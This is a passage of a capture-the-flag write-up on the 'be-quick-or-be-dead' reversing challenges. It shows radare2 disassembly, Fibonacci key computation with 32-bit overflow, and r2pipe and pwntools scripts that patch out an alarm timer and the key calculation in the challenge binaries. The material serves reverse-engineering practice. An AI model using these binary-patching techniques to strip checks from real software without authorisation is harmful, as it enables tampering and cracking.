|           0<span style="color:#50fa7b">x0040070a</span>      <span style="color:#8be9fd;font-style:italic">b8166586eb</span>     <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">0xeb866516</span>
|           0<span style="color:#50fa7b">x0040070f</span>      <span style="color:#bd93f9">5</span><span style="color:#8be9fd;font-style:italic">d</span>             <span style="color:#8be9fd;font-style:italic">pop</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
|           0<span style="color:#50fa7b">x00400710</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
[0<span style="color:#50fa7b">x0040070a</span>]<span style="color:#ff79c6">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>A similar implementation in python</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> sys
<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">import</span> r2pipe

ELF <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./patched-be-quick-or-be-dead-1&#34;</span>
ADDRESS<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x0040070a</span>
INSTRUCTIONS <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;mov dword [rbp-0x4], 0xeb866515&#34;</span>
INSTRUCTIONS <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;mov eax, 0xeb866516 ; pop rbp ; ret&#34;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">patch_instructions</span>(address, instructions):
    r2 <span style="color:#ff79c6">=</span> r2pipe<span style="color:#ff79c6">.</span>open(ELF)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;s </span><span style="color:#f1fa8c">{</span>address<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#34;oo+&#34;</span>)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&#34;wa </span><span style="color:#f1fa8c">{</span>instructions<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;&#39;</span>)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#34;q&#34;</span>)

patch_instructions(ADDRESS, INSTRUCTIONS)
os<span style="color:#ff79c6">.</span>system(ELF)
</code></pre></td></tr></table>
</div>
</div><h2 id="be-quick-or-be-dead-2">be-quick-or-be-dead-2</h2>
<ul>
<li><a href="./resources/be-quick-or-be-dead-2/be-quick-or-be-dead-2">be-quick-or-be-dead-2</a></li>
</ul>
<p>Our key is the 1083th fibonacci&rsquo;s number. Calculating such a large number takes time, so we don&rsquo;t have time to calculate it before the alarm handler is triggered</p>
<p>Note: By convention in 64 bits, first argument is always stored in rdi, second argument is always in rsi (see calling conventions)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">[0<span style="color:#50fa7b">x004005a0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pdf</span> @ <span style="color:#8be9fd;font-style:italic">sym.calculate_key</span>
            <span style="color:#6272a4">; CALL XREF from sym.get_key @ 0x4007e1</span>
/ 16: <span style="color:#50fa7b">sym.calculate_key</span> ()<span style="color:#6272a4">;</span>
|           0<span style="color:#50fa7b">x0040074b</span>      <span style="color:#bd93f9">55</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
|           0<span style="color:#50fa7b">x0040074c</span>      <span style="color:#bd93f9">4889</span><span style="color:#8be9fd;font-style:italic">e5</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">rbp</span>, <span style="color:#8be9fd;font-style:italic">rsp</span>
|           0<span style="color:#50fa7b">x0040074f</span>      <span style="color:#8be9fd;font-style:italic">bf3b040000</span>     <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edi</span>, <span style="color:#bd93f9">0x43b</span>              <span style="color:#6272a4">; 1083</span>
|           0<span style="color:#50fa7b">x00400754</span>      <span style="color:#8be9fd;font-style:italic">e8adffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.fib</span>
|           0<span style="color:#50fa7b">x00400759</span>      <span style="color:#bd93f9">5</span><span style="color:#8be9fd;font-style:italic">d</span>             <span style="color:#8be9fd;font-style:italic">pop</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
\           0<span style="color:#50fa7b">x0040075a</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>We can pre-calculate this large number in advance and patch our binary to avoid computation time.</p>
<p>In radare2, We can see that the large fibonacci number will be stored in a dword (32bits). Therefore the number will overflow and only the first 32bits will be used as a key.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">|           0<span style="color:#50fa7b">x004007e1</span>      <span style="color:#8be9fd;font-style:italic">e865ffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.calculate_key</span>
|           0<span style="color:#50fa7b">x004007e6</span>      <span style="color:#bd93f9">8905</span><span style="color:#8be9fd;font-style:italic">d4082000</span>   <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">obj.key</span>], <span style="color:#8be9fd;font-style:italic">eax</span>    <span style="color:#6272a4">; rdi</span>
</code></pre></td></tr></table>
</div>
</div><p>In this website, we can find the <a href="https://oeis.org/A000045/b000045.txt">first 2000 fibonacci numbers</a>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#1083th fibo number</span>
number <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x682fd0caeca9b50f789fb1d06e5e95c67d7552a5d91ec303efbf5d2f46deb661ba53cc978b6951521b1bff142e20a135c48d97ca10140802580d1d5bcfb9ae37663991c49b314aa8801103f13f5ba67e2e71c7b47358bb9ff7f4c0684a42</span>L
<span style="color:#6272a4">#simulate the overflow</span>
<span style="color:#8be9fd;font-style:italic">hex</span>(number <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xFFFFFFFF</span>)
<span style="color:#f1fa8c">&#39;0xc0684a42L&#39;</span>	<span style="color:#6272a4">#the key after overflow</span>
</code></pre></td></tr></table>
</div>
</div><p>We can alternatively calculate ourselves the fibonacci number if we respect two rules:</p>
<ol>
<li>keep only first 32bits to simulate the dword overflow</li>
<li>avoid recursion to avoid <code>RuntimeError: maximum recursion depth exceeded</code></li>
</ol>
<p>Solution:</p>
<ol>
<li>We can simulate the overflow by using <code>numpy.uint32(..)</code> or <code>number &amp; 0xFFFFFFFF</code></li>
<li>To avoid recursion, we can use a Memoization decorator that will cache in a dictionary any previous fibonacci&rsquo;s number it calculated in the past</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> numpy <span style="color:#ff79c6">as</span> np

np<span style="color:#ff79c6">.</span>seterr(<span style="color:#8be9fd;font-style:italic">all</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;ignore&#34;</span>)				<span style="color:#6272a4">#ignore warnings due tu overflows</span>

<span style="color:#ff79c6">class</span> <span style="color:#50fa7b">Memoize</span>(<span style="color:#8be9fd;font-style:italic">object</span>):
    <span style="color:#ff79c6">def</span> __init__(self, func):
        self<span style="color:#ff79c6">.</span>func <span style="color:#ff79c6">=</span> func
        self<span style="color:#ff79c6">.</span>cache <span style="color:#ff79c6">=</span> {}
    <span style="color:#ff79c6">def</span> __call__(self, <span style="color:#ff79c6">*</span>args):
        <span style="color:#ff79c6">if</span> args <span style="color:#ff79c6">in</span> self<span style="color:#ff79c6">.</span>cache:
            <span style="color:#ff79c6">return</span> self<span style="color:#ff79c6">.</span>cache[args]
        ret <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>func(<span style="color:#ff79c6">*</span>args)
        self<span style="color:#ff79c6">.</span>cache[args] <span style="color:#ff79c6">=</span> ret
        <span style="color:#ff79c6">return</span> ret

@Memoize
<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">fib</span>(n):
    <span style="color:#ff79c6">if</span> n <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>:
        <span style="color:#ff79c6">return</span> np<span style="color:#ff79c6">.</span>uint32(<span style="color:#bd93f9">0</span>)
    <span style="color:#ff79c6">elif</span> n <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>:
        <span style="color:#ff79c6">return</span> np<span style="color:#ff79c6">.</span>uint32(<span style="color:#bd93f9">1</span>)
    <span style="color:#ff79c6">return</span> fib(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>) <span style="color:#ff79c6">+</span> fib(n<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)


<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
    requested_number <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1083</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(requested_number<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>):		<span style="color:#6272a4">#cache 1082 fibonacci&#39;s number</span>
        fib(i)
    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(fib(requested_number)))
</code></pre></td></tr></table>
</div>
</div><p>Having the key <code>0xc0684a42</code>, we can now use pwntools to patch the binary assembly by removing the alarm and skipping the fibonacci key calculation. A <code>new</code> binary is created:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">elf<span style="color:#ff79c6">.</span>asm( elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;alarm&#39;</span>], <span style="color:#f1fa8c">&#39;ret&#39;</span> )
elf<span style="color:#ff79c6">.</span>asm( elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;calculate_key&#39;</span>], <span style="color:#f1fa8c">&#39;mov eax, </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">ret</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> ( <span style="color:#8be9fd;font-style:italic">hex</span>(number <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xFFFFFFFF</span> ) ) )
elf<span style="color:#ff79c6">.</span>save(<span style="color:#f1fa8c">&#39;./new&#39;</span>)
</code></pre></td></tr></table>
</div>
</div><p>Full exploit using pwntools</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
<span style="color:#ff79c6">import</span> os

context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;critical&#39;</span>

elf <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;./be-quick-or-be-dead-2&#39;</span>)

<span style="color:#6272a4">#1083th fibo number</span>
number <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x682fd0caeca9b50f789fb1d06e5e95c67d7552a5d91ec303efbf5d2f46deb661ba53cc978b6951521b1bff142e20a135c48d97ca10140802580d1d5bcfb9ae37663991c49b314aa8801103f13f5ba67e2e71c7b47358bb9ff7f4c0684a42</span>L
<span style="color:#6272a4">#key = number &amp; 0xFFFFFFFF</span>
<span style="color:#6272a4">#key = 0xc0684a42</span>

elf<span style="color:#ff79c6">.</span>asm( elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;alarm&#39;</span>], <span style="color:#f1fa8c">&#39;ret&#39;</span> )
elf<span style="color:#ff79c6">.</span>asm( elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;calculate_key&#39;</span>], <span style="color:#f1fa8c">&#39;mov eax, </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">ret</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> ( <span style="color:#8be9fd;font-style:italic">hex</span>(number <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xFFFFFFFF</span> ) ) )
elf<span style="color:#ff79c6">.</span>save(<span style="color:#f1fa8c">&#39;./new&#39;</span>)

os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#39;chmod +x ./new&#39;</span>)
p <span style="color:#ff79c6">=</span> process(<span style="color:#f1fa8c">&#39;./new&#39;</span>)
p<span style="color:#ff79c6">.</span>poll(<span style="color:#ff79c6">True</span>)
<span style="color:#8be9fd;font-style:italic">print</span> p<span style="color:#ff79c6">.</span>recvall()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>]
</code></pre></td></tr></table>
</div>
</div><h2 id="be-quick-or-be-dead-3">be-quick-or-be-dead-3</h2>
<ul>
<li><a href="./resources/be-quick-or-be-dead-3/be-quick-or-be-dead-3">be-quick-or-be-dead-3</a></li>
</ul>
<p>same as previous in the be-quick-or-be-dead series, a timer is set but the calculate_key function is not fast enough.</p>
<p>However this time, the binary is 64bits.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">[0<span style="color:#50fa7b">x004005a0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pdf</span> @ <span style="color:#8be9fd;font-style:italic">sym.calculate_key</span>
            <span style="color:#6272a4">; CALL XREF from sym.get_key @ 0x400828</span>
/ 16: <span style="color:#50fa7b">sym.calculate_key</span> ()<span style="color:#6272a4">;</span>
|           0<span style="color:#50fa7b">x00400792</span>      <span style="color:#bd93f9">55</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
|           0<span style="color:#50fa7b">x00400793</span>      <span style="color:#bd93f9">4889</span><span style="color:#8be9fd;font-style:italic">e5</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">rbp</span>, <span style="color:#8be9fd;font-style:italic">rsp</span>
|           0<span style="color:#50fa7b">x00400796</span>      <span style="color:#8be9fd;font-style:italic">bfb5860100</span>     <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edi</span>, <span style="color:#bd93f9">0x186b5</span>
|           0<span style="color:#50fa7b">x0040079b</span>      <span style="color:#8be9fd;font-style:italic">e866ffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.calc</span>
|           0<span style="color:#50fa7b">x004007a0</span>      <span style="color:#bd93f9">5</span><span style="color:#8be9fd;font-style:italic">d</span>             <span style="color:#8be9fd;font-style:italic">pop</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
\           0<span style="color:#50fa7b">x004007a1</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>It calls a recursive function sym.calc(0x186b5) that we have to reverse engineer</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
